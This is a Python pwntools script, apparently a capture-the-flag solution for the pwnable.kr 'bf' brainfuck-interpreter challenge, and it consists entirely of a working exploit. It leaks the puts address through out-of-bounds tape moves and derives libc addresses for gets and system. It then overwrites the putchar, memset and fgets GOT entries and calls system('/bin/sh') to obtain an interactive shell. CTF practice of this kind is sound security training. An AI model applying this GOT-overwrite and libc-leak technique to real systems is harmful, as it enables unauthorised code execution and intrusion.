from pwn import *

context(os='linux', arch='i386', log_level='info')

DEBUG = 1
if DEBUG:
    p = process('./bf')
    so = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    p = remote('pwnable.kr', 9001)
    so = ELF('./bf_libc.so')

ins =  0x88 * '<' + '.>.>.>.>'   # get puts_addr
ins += 0x14 * '>' + ',>,>,>,>'   # change putchar_got to main
ins += 0x8  * '<' + ',>,>,>,>'   # change memset_got to gets
ins += 0x20 * '<' + ',>,>,>,>'   # change fgets_got to system
ins += '.'  # return to main

# print ins

p.recvuntil('[ ]\n')
p.sendline(ins)

#leak1 = p.recv(1)
#leak = leak1 + p.recv(3)

leak = p.recv(4)
puts_addr = u32(leak)
log.info('puts_addr = ' + hex(puts_addr))

gets_addr = puts_addr + (so.symbols['gets'] - so.symbols['puts'])
log.info('gets_addr = ' + hex(gets_addr))
system_addr = puts_addr + (so.symbols['system'] - so.symbols['puts'])
log.info('system_addr = ' + hex(system_addr))

main_addr = 0x8048671

shellcode = p32(main_addr) + p32(gets_addr) + p32(system_addr) + '/bin/sh\x00'
p.sendline(shellcode)

p.interactive()
